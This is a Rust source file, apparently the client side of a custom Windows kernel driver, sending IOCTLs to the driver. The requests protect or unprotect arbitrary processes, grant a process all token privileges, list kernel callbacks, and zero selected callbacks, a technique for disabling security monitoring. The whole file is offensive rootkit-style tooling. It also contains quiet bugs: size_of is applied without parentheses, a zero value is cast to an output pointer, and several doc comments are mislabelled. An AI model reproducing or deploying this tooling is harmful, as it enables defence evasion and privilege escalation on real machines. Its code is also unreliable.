use std::{mem::size_of, ptr::null_mut};
use winapi::{um::{ioapiset::DeviceIoControl}, ctypes::c_void};
use common::{TargetProcess, IOCTL_PROCESS_PROTECT_REQUEST, IOCTL_PROCESS_UNPROTECT_REQUEST, IOCTL_PROCESS_TOKEN_PRIVILEGES_REQUEST, IOCTL_CALLBACKS_ENUM_REQUEST, CallBackInformation, TargetCallback, IOCTL_CALLBACKS_ZERO_REQUEST};

/// Protect a process as PsProtectedSignerWinTcb
pub fn protect_process(process_id: u32, driver_handle: *mut c_void) {
    let bytes: u32 = 0;
    
    let mut target_process = TargetProcess {
        process_id: process_id,
    };
    
    let device_io_control_result = unsafe { 
        DeviceIoControl(driver_handle,
        IOCTL_PROCESS_PROTECT_REQUEST,
        &mut target_process as *mut _ as *mut c_void,
        size_of::<TargetProcess> as u32,
        null_mut(),
        0,
        bytes as *mut u32,
        null_mut())
    };

    if device_io_control_result == 0 {
        panic!("[-] Failed to call DeviceIoControl");
    }
}

/// Remove the protection of a process
pub fn unprotect_process(process_id: u32, driver_handle: *mut c_void) {
    let bytes: u32 = 0;
    
    let mut target_process = TargetProcess {
        process_id: process_id,
    };
    
    let device_io_control_result = unsafe { 
        DeviceIoControl(driver_handle,
        IOCTL_PROCESS_UNPROTECT_REQUEST,
        &mut target_process as *mut _ as *mut c_void,
        size_of::<TargetProcess> as u32,
        null_mut(),
        0,
        bytes as *mut u32,
        null_mut())
    };

    if device_io_control_result == 0 {
        panic!("[-] Failed to call DeviceIoControl");
    }
}

/// Remove the protection of a process
pub fn enable_tokens(process_id: u32, driver_handle: *mut c_void) {
    let bytes: u32 = 0;
    
    let mut target_process = TargetProcess {
        process_id: process_id,
    };
    
    let device_io_control_result = unsafe { 
        DeviceIoControl(driver_handle,
        IOCTL_PROCESS_TOKEN_PRIVILEGES_REQUEST,
        &mut target_process as *mut _ as *mut c_void,
        size_of::<TargetProcess> as u32,
        null_mut(),
        0,
        bytes as *mut u32,
        null_mut())
    };

    if device_io_control_result == 0 {
        panic!("[-] Failed to call DeviceIoControl");
    }
}

/// Enumerate Kernel Callbacks
pub fn enumerate_callbacks(driver_handle: *mut c_void) {
    
    let mut bytes: u32 = 0;
    let mut callbacks: [CallBackInformation; 64] = unsafe{ std::mem::zeroed() };
    
    let device_io_control_result = unsafe { 
        DeviceIoControl(driver_handle,
        IOCTL_CALLBACKS_ENUM_REQUEST,
        null_mut(),
        0,
        callbacks.as_mut_ptr() as *mut _,
        (callbacks.len() * size_of::<CallBackInformation>()) as u32,
        &mut bytes,
        null_mut())
    };

    if device_io_control_result == 0 {
        panic!("[-] Failed to call DeviceIoControl");
    }

    let number_of_callbacks = (bytes / size_of::<CallBackInformation>() as u32) as usize;
    println!("Total Kernel Callbacks: {:?}", number_of_callbacks);

    for i in 0..number_of_callbacks {
        if callbacks[i].pointer > 0 {
            let name = std::str::from_utf8(&callbacks[i].module_name).unwrap().trim_end_matches('\0');
            println!("[{:?}] {:#x} ({:?})", i, callbacks[i].pointer, name);
        }
    }
}

/// Remove the protection of a process
pub fn patch_callback(index: u32, driver_handle: *mut c_void) {
    let bytes: u32 = 0;
    
    let mut target = TargetCallback {
        index: index,
    };
    
    let device_io_control_result = unsafe { 
        DeviceIoControl(driver_handle,
        IOCTL_CALLBACKS_ZERO_REQUEST,
        &mut target as *mut _ as *mut c_void,
        size_of::<TargetProcess> as u32,
        null_mut(),
        0,
        bytes as *mut u32,
        null_mut())
    };

    if device_io_control_result == 0 {
        panic!("[-] Failed to call DeviceIoControl");
    }
}